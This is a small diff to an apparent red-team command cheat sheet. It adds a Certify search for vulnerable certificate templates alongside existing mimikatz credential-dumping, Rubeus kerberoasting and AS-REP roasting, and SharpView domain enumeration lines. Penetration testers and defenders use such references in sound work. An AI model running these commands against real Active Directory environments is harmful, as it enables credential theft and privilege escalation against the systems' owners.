@@ -241,6 +241,7 @@ mimikatz Command "privilege::debug sekurlsa::logonPasswords"
 =================
 rubeus kerberoast
 rubeus asreproast /user:username
+certify find /vulnerable /currentuser
 sharpview Get-NetUser -SamAccountName ben
 sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
 sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
